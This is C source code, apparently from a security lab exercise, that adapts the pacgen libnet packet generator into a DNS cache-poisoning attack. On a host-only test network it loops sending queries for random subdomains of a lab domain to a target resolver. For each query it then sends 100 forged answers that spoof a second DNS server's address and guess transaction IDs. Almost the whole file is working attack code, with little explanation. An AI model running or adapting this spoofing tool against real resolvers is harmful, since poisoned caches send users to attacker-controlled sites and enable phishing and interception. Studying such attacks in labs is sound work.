/*		    GNU GENERAL PUBLIC LICENSE
		       Version 2, June 1991
 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
*/
#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
    int c;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    char eth_file[FILENAME_MAX] = "";
    char ip_file[FILENAME_MAX] = "";
    char tcp_file[FILENAME_MAX] = "";
    char payload_file[FILENAME_MAX] = "";
    char attack_domain[] = "dnsphishinglab.com";	// attack target domain
    char target_dns_ip[] = "192.168.56.101";	// target dns server which is going to be attacked
    char client_ip[] = "192.168.56.102";		// IP of the client with which we will sends DNS query
    char dns_server_2[] = "192.168.56.104";	// DNS server 2 IP
    char dev[] = "eth11"; //interface of the host-only network
    u_long i_target_dns_ip;
    u_long i_client_ip;
    u_long i_dns_server_2;
    char subdomain_host[50];
    char *payload_location;
    
    int x;
    int y = 0;
    int udp_src_port = 1;       /* UDP source port */
    int udp_des_port = 1;       /* UDP dest port */
    int z;
    int i;
    int payload_filesize = 0;
    u_char eth_saddr[6];	/* NULL Ethernet saddr */
    u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_naddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_proto[60];       /* Ethernet protocal */
    u_long eth_pktcount;        /* How many packets to send */
    long nap_time;              /* How long to sleep */
    u_char ip_proto[40];
    u_char spa[4]={0x0, 0x0, 0x0, 0x0};
    u_char tpa[4]={0x0, 0x0, 0x0, 0x0};
    u_char *device = NULL;
    u_char i_ttos_val = 0;	/* final or'd value for ip tos */
    u_char i_ttl;		/* IP TTL */
    u_short e_proto_val = 0;    /* final resulting value for eth_proto */
    u_short ip_proto_val = 0;   /* final resulting value for ip_proto */

    int t_src_port;     /* TCP source port */
    int t_des_port;     /* TCP dest port */
    int t_win;      /* TCP window size */
    int t_urgent;       /* TCP urgent data pointer */
    int i_id;       /* IP id */
    int i_frag;     /* IP frag */
    u_short head_type;          /* TCP or UDP */

    u_long t_ack;       /* TCP ack number */
    u_long t_seq;       /* TCP sequence number */
    u_long i_des_addr;      /* IP dest addr */
    u_long i_src_addr;      /* IP source addr */
    u_char t_control_val = 0;   /* final or'd value for tcp control */
    u_char i_ttos[90];      /* IP TOS string */
    u_char t_control[65];   /* TCP control string */
int
main(int argc, char *argv[])
{
    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
			dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }
    i_target_dns_ip = libnet_name2addr4(l, target_dns_ip, LIBNET_RESOLVE);
    i_client_ip = libnet_name2addr4(l, client_ip, LIBNET_RESOLVE);
    i_dns_server_2 = libnet_name2addr4(l, dns_server_2, LIBNET_RESOLVE);
    srand((int)time(0));	// initialize random seed

    while ((c = getopt (argc, argv, "p:t:i:e:")) != EOF)
    {
        switch (c)
        {
            case 'p':
                strcpy(payload_file, optarg);
                break;
            case 't':
                strcpy(tcp_file, optarg);
                break;
            case 'i':
                strcpy(ip_file, optarg);
                break;
            case 'e':
                strcpy(eth_file, optarg);
                break;
            default:
                break;
        }
    }

    if (optind != 9)
    {    
        usage();
        exit(0);
    }
    
    //load_payload();
    load_ethernet();
    load_tcp_udp();
    load_ip();
    convert_proto();


while (1==1)  //start of infinite loop which sends multiple requests with random non-existing names in the attack-domain
{
	int randomNumber = (rand()%10000000);
	while (randomNumber<1000000) randomNumber*=10;
    sprintf(subdomain_host, ".x-%d.%s", randomNumber,attack_domain);
    printf("\nNow attacking with domain %s \n",subdomain_host);
    formatDomain();
    load_payload_query();
	    
	    t = libnet_build_udp(
		    t_src_port,                                /* source port */
		    t_des_port,                                /* destination port */
		    LIBNET_UDP_H + payload_filesize,           /* packet length */
		    0,                                         /* checksum */
		    payload_location,                          /* payload */
		    payload_filesize,                          /* payload size */
		    l,                                         /* libnet handle */
		    0);                                        /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
        printf("after udp\n");
	    t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + payload_filesize,          /* length */
		i_ttos_val,                         /* TOS */
		i_id,                                                  /* IP ID */
		i_frag,                                                /* IP Frag */
		i_ttl,                                                 /* TTL */
		IPPROTO_UDP,                                          /* protocol */
		0,                                                     /* checksum */
		i_src_addr,                                            /* source IP */
		i_des_addr,                                            /* destination IP */
		NULL,                                                  /* payload */
		0,                                                     /* payload size */
		l,                                                     /* libnet handle */
		0);                                                    /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ethernet(
		eth_daddr,                                   /* ethernet destination */
		eth_saddr,                                   /* ethernet source */
		ETHERTYPE_IP,                                 /* protocol type */
		NULL,                                        /* payload */
		0,                                           /* payload size */
		l,                                           /* libnet handle */
		0);                                          /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	     /*	
	     *  Write it to the wire.
	     */
        c = libnet_write(l);
        free(payload_location);
    libnet_destroy(l);
    for (i=0;i<100;i++) {	// this loop will send multiple fake responses for each query
        l = libnet_init(
            LIBNET_LINK,                             /* injection type */
	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
        load_payload_answer();
	    // always builds UDP
	    t = libnet_build_udp(
		    53,                                /* source port */
		    33333,                                /* destination port */
		    LIBNET_UDP_H + payload_filesize,           /* packet length */
		    0,                                         /* checksum */
		    payload_location,                          /* payload */
		    payload_filesize,                          /* payload size */
		    l,                                         /* libnet handle */
		    0);                                        /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + payload_filesize,          /* length */
		0,                         /* TOS */
		12345,                                                  /* IP ID */
		IP_DF,                                                /* IP Frag */
		255,                                                 /* TTL */
		IPPROTO_UDP,                                          /* protocol */
		0,                                                     /* checksum */
		i_dns_server_2,                                            /* source IP */
		i_target_dns_ip,                                            /* destination IP */
		NULL,                                                  /* payload */
		0,                                                     /* payload size */
		l,                                                     /* libnet handle */
		0);                                                    /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ethernet(
		eth_daddr,                                   /* ethernet destination */
		eth_naddr,                                   /* ethernet source */
		ETHERTYPE_IP,                                 /* protocol type */
		NULL,                                        /* payload */
		0,                                           /* payload size */
		l,                                           /* libnet handle */
		0);                                          /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	     /*	
	     *  Write it to the wire.
	     */
        c = libnet_write(l);
        free(payload_location);
        libnet_destroy(l);
    }
    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
// end ---------------------------------------------------------------
}
printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */
    /* give the buf memory back */
    libnet_destroy(l);
    return (0);
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
	    
}

usage()
{
    fprintf(stderr, "pacgen 1.10 by Bo Cato. Protected under GPL.\nusage: pacgen -p <payload file> -t <TCP/UDP file> -i <IP file> -e <Ethernet file>\n");
}

formatDomain() {
    unsigned int len = (unsigned)strlen(subdomain_host);
    printf("length%i",len);
    int i=0;
    while (len>0) {
        if (subdomain_host[len-1]=='.') {
            subdomain_host[len-1]=i;
            printf("%c\n",i);
            i=0;
        }
        else {
            i++;
        }
        len--;
    }
    printf("%s\n",subdomain_host);
}
/* load_payload: load the payload into memory */
load_payload_query()
{
    FILE *infile;
    struct stat statbuf;
    int i = 0;
    int j = 0;
    int c = 0;
    unsigned int len = (unsigned)strlen(subdomain_host);
    char payload_file[] = "payload_query2_new";
    stat(payload_file, &statbuf);
    payload_filesize = statbuf.st_size+len;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }
    /* open the file and read it into memory */
    infile = fopen(payload_file, "r");	/* open the payload file read only */
    printf("file opened successfully\n");
    while((c = getc(infile)) != EOF)
    {
        if (i==12) { //Query name starts from the 13th byte of the DNS payload
            for (j=0;j<len;j++) {
                *(payload_location + i + j) = subdomain_host[j]; //put the query name in the payload
            }
            i+=len;
        }
        *(payload_location + i) = c;
        i++;
    }
    fclose(infile);
    printf("Exiting load_payload_query\n");
}
/* load_payload: load the payload into memory */
load_payload_answer()
{
    printf("Inside payload answer\n");
    FILE *infile;
    struct stat statbuf;
    int i = 2;
    int j = 0;
    int c = 0;
    unsigned int len = (unsigned)strlen(subdomain_host);
    char payload_file[] = "payload_response_addon";
    int transID[] = {rand()%256,rand()%256}; // generate random transaction ID of two bytes
    stat(payload_file, &statbuf);
    payload_filesize = statbuf.st_size+len+2;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }
    *payload_location = transID[0];
    *(payload_location+1) = transID[1];
    /* open the file and read it into memory */
    infile = fopen(payload_file, "r");	/* open the payload file read only */
    
    while((c = getc(infile)) != EOF)
    {
        if (i==12) {
            for (j=0;j<len;j++) {
                *(payload_location + i + j) = subdomain_host[j];
            }
            i+=len;
        }
        *(payload_location + i) = c;
        i++;
    }
    fclose(infile);
}

load_ethernet()
{
    FILE *infile;

    char s_read[40];
    char d_read[40];
    char n_read[40];
    char p_read[60];
    char count_line[40];

    infile = fopen(eth_file, "r");

    fgets(s_read, 40, infile);         /*read the source mac*/
    fgets(d_read, 40, infile);         /*read the destination mac*/
    fgets(n_read, 40, infile);          /*read the dns server 2 mac*/
    fgets(p_read, 60, infile);         /*read the desired protocal*/
    fgets(count_line, 40, infile);     /*read how many packets to send*/

    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    sscanf(n_read, "naddr,%x, %x, %x, %x, %x, %x", &eth_naddr[0], &eth_naddr[1], &eth_naddr[2], &eth_naddr[3], &eth_naddr[4], &eth_naddr[5]);
    sscanf(p_read, "proto,%s", &eth_proto);
    sscanf(count_line, "pktcount,%d", &eth_pktcount);

    fclose(infile);
}

    /* load_tcp_udp: load TCP or UDP data file into the variables */
load_tcp_udp()
{
    FILE *infile;

    char sport_line[20] = "";
    char dport_line[20] = "";
    char seq_line[20] = "";
    char ack_line[20] = "";
    char control_line[65] = "";
    char win_line[20] = "";
    char urg_line[20] = "";

    infile = fopen(tcp_file, "r");

    fgets(sport_line, 15, infile);  /*read the source port*/
    fgets(dport_line, 15, infile);  /*read the dest port*/
    fgets(win_line, 12, infile);    /*read the win num*/
    fgets(urg_line, 12, infile);    /*read the urg id*/
    fgets(seq_line, 13, infile);    /*read the seq num*/
    fgets(ack_line, 13, infile);    /*read the ack id*/
    fgets(control_line, 63, infile);    /*read the control flags*/

    /* parse the strings and throw the values into the variable */

    sscanf(sport_line, "sport,%d", &t_src_port);
    sscanf(sport_line, "sport,%d", &udp_src_port);
    sscanf(dport_line, "dport,%d", &t_des_port);
    sscanf(dport_line, "dport,%d", &udp_des_port);
    sscanf(win_line, "win,%d", &t_win);
    sscanf(urg_line, "urg,%d", &t_urgent);
    sscanf(seq_line, "seq,%ld", &t_seq);
    sscanf(ack_line, "ack,%ld", &t_ack);
    sscanf(control_line, "control,%[^!]", &t_control);

    fclose(infile); /*close the file*/
}

    /* load_ip: load IP data file into memory */
load_ip()
{
    FILE *infile;

    char proto_line[40] = "";
    char id_line[40] = "";
    char frag_line[40] = "";
    char ttl_line[40] = "";
    char saddr_line[40] = "";
    char daddr_line[40] = "";
    char tos_line[90] = "";
    char z_zsaddr[40] = "";
    char z_zdaddr[40] = "";
    char inter_line[15]="";

    infile = fopen(ip_file, "r");

    fgets(id_line, 11, infile);     /* this stuff should be obvious if you read the above subroutine */
    fgets(frag_line, 13, infile);   /* see RFC 791 for details */
    fgets(ttl_line, 10, infile);
    fgets(saddr_line, 24, infile);
    fgets(daddr_line, 24, infile);
    fgets(proto_line, 40, infile);
    fgets(inter_line, 15, infile);
    fgets(tos_line, 78, infile);
    
    sscanf(id_line, "id,%d", &i_id);
    sscanf(frag_line, "frag,%d", &i_frag);
    sscanf(ttl_line, "ttl,%d", &i_ttl);
    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
    sscanf(proto_line, "proto,%s", &ip_proto);
    sscanf(inter_line, "interval,%d", &nap_time);
    sscanf(tos_line, "tos,%[^!]", &i_ttos);

    i_src_addr = libnet_name2addr4(l, z_zsaddr, LIBNET_RESOLVE);
    i_des_addr = libnet_name2addr4(l, z_zdaddr, LIBNET_RESOLVE);
    
    fclose(infile);
}

convert_proto()
{

/* Need to add more Ethernet and IP protocals to choose from */

    if(strstr(eth_proto, "arp") != NULL)
      e_proto_val = e_proto_val | ETHERTYPE_ARP;

    if(strstr(eth_proto, "ip") != NULL)
      e_proto_val = e_proto_val | ETHERTYPE_IP;

    if(strstr(ip_proto, "tcp") != NULL)
        ip_proto_val = ip_proto_val | IPPROTO_TCP;

    if(strstr(ip_proto, "udp") != NULL)
      ip_proto_val = ip_proto_val | IPPROTO_UDP;
}

    /* convert_toscontrol:  or flags in strings to make u_chars */
convert_toscontrol()
{
    if(strstr(t_control, "th_urg") != NULL)
        t_control_val = t_control_val | TH_URG;

    if(strstr(t_control, "th_ack") != NULL)
        t_control_val = t_control_val | TH_ACK;

    if(strstr(t_control, "th_psh") != NULL)
        t_control_val = t_control_val | TH_PUSH;

    if(strstr(t_control, "th_rst") != NULL)
        t_control_val = t_control_val | TH_RST;

    if(strstr(t_control, "th_syn") != NULL)
        t_control_val = t_control_val | TH_SYN;

    if(strstr(t_control, "th_fin") != NULL)
        t_control_val = t_control_val | TH_FIN;

    if(strstr(i_ttos, "iptos_lowdelay") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_LOWDELAY;

    if(strstr(i_ttos, "iptos_throughput") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_THROUGHPUT;

    if(strstr(i_ttos, "iptos_reliability") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_RELIABILITY;

    if(strstr(i_ttos, "iptos_mincost") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_MINCOST;
}
/* EOF */
